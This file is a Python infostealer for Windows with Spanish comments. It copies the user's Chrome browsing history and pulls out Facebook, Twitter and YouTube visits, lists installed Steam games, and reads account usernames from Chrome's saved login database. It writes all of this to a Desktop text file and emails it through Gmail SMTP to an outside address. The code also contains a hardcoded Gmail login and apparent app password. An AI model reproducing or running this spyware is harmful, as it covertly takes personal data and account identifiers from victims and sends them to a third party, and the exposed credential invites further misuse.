import os
import re
import sqlite3
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from random import randint
from shutil import copyfile
from time import sleep
from smtplib import SMTP
from email import encoders

#FUNCION PARA CREAR UN NUMERO ALEATORIO PARA EJECUCIÓN DE SCRIPT.
def random_int():
    a = randint(1, 2)
    print("Durmiendo")
    sleep(a)

#FUNCIÓN PARA CREAR UNA CONEXIÓN A LA BASE DE DATOS DEL HISTORIAL DE VIVALDI
def historial(consulta):
    ulrs = None
    while not ulrs: #mientras no haya nada intenta
        #Esto se va a intentar hasta que ulrs no sea nada
        #Entonces mostrará la excepción
        #Cuando ulrs ya sea algo dejará de intentar, el try se ejecuta y la exception ya no salta.
        try:
            history_chrome = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{consulta}"
            history_vivaldi = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"
            conn = sqlite3.connect(history_chrome)
            statement = conn.cursor()
            statement.execute("SELECT * FROM logins")
            urls = statement.fetchall()
            return urls
        except sqlite3.OperationalError:
            print("esperando")
            random_int()

def history_temp(consulta):
    ulrs = None
    while not ulrs:  # mientras no haya nada intenta
        # Esto se va a intentar hasta que ulrs no sea nada
        # Entonces mostrará la excepción
        # Cuando ulrs ya sea algo dejará de intentar, el try se ejecuta y la exception ya no salta.
        try:
            history_chrome = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\{consulta}"
            #history_vivaldi = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Vivaldi\\User Data\\Default\\{consulta}"
            temp_history_c = history_chrome + "temp"
            #temp_history_v = history_vivaldi + "temp"
            copyfile(history_chrome, temp_history_c)
            conn = sqlite3.connect(temp_history_c)
            statement = conn.cursor()
            statement.execute("SELECT * FROM urls ORDER BY last_visit_time DESC")
            urls = statement.fetchall()
            return urls
        except sqlite3.OperationalError:
            print("esperando")
            random_int()

def accounts(file):
    for i in historial("Login data"):
        file.write("\n\n"+i[3])

#FUNCIÓN PARA CREAR UN ARCHIVO DE TEXTO CON LA RUTA DEL ARCHIVO COMO PARÁMETRO.
def create_file(desktop_path):
    o = open(desktop_path + "Hola.txt", "w")
    return o


def juegos(path, file):
    a = None
    while not a:
        try:
            a = os.listdir(path)
            for i in a:
                file.write("\n\nSé también que juegos tienes: \n" + i)
        except Exception:
            print("No hay steam")


def ver_historial_facebook(file, history):
    visitas = []
    try:
        for i in history:
            resultados_fb = re.findall("https://www.facebook.com/([A-Za-z0-9].+)", i[1])
            if resultados_fb:  #si existen resultados =>
                visitas.append("facebook: " + resultados_fb[0])

        file.write("\n\nHas visitado las siguientes páginas de facebook: \n\n{}".format("\n".join(visitas)))
    except Exception:
        print("No hay nada")


def ver_historial_twitter(file, history):
    visitas = []
    try:
        for i in history:
            resultados_tw = re.findall("https://twitter.com/([A-Za-z0-1]+$)", i[1])
            if resultados_tw:
                visitas.append("twitter: " + resultados_tw[0])

        file.write("\n\nHas visitado las siguientes páginas de twitter: \n\n{}".format("\n".join(visitas)))
    except Exception:
        print("No hay nada")


def ver_historial_youtube(file, history):
    visitas = []
    try:
        for i in history:
            resultados_yt = re.findall("https://www.youtube.com/watch.*", i[1])
            if resultados_yt:
                visitas.append("youtube: " + resultados_yt[0])

        file.write("\n\nHas visitado las siguientes páginas de youtube: \n\n{}".format("\n".join(visitas)))
    except Exception:
        print("No hay nada")


def enviar(file, nombre_adjunto, asunto):
    mensaje = MIMEMultipart()
    mensaje["From"] = "falcorjg@gmail.com"
    mensaje["To"] = "jesus.machaca@tecsup.edu.pe"
    mensaje["Subject"] = asunto
    mensaje.attach(MIMEText("", "plain"))
    adjunto = MIMEBase("application", "octet-stream")
    adjunto.set_payload(open(file, "rb").read())
    adjunto.add_header("content-Disposition", f'attachment; filename="{nombre_adjunto}.txt"')
    encoders.encode_base64(adjunto)
    mensaje.attach(adjunto)
    smtp = SMTP("smtp.gmail.com")
    smtp.starttls()
    smtp.login("falcorjg@gmail.com", "xppikjbzdavplepw")
    smtp.sendmail("falcorjg@gmail.com", "jesus.machaca@tecsup.edu.pe", mensaje.as_string())
    smtp.quit()


#FUNCIÓN PRINCIPAL PARA LLAMAR A LAS DEMÁS FUNCIONES
def main():
    random_int()   #SE LLAMA A LA FUNCIÓN PARA CREAR NUMERO ALEATORIO PARA LA EJECUCIÓN
    desktop_path = f"C:\\Users\\{os.getlogin()}\\Desktop\\"  #CREACIÓN DE UNA VARIABLE QUE CONTIENE LA RUTA
    path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
    file = create_file(desktop_path)  #SE LLAMA A LA FUNCIÓN PARA CREAR UN ARCHIVO CON LA RUTA DADA COMO PARÁMETRO
    filec = desktop_path+"Hola.txt"
    #Historiales
    history = history_temp("History")
    ver_historial_youtube(file, history)
    ver_historial_facebook(file, history)
    ver_historial_twitter(file, history)
    #this pc
    juegos(path, file)
    #accounts
    accounts(file)
    file.close()
    enviar(filec, "Hola", "Importante")

if __name__ == "__main__":
    main()
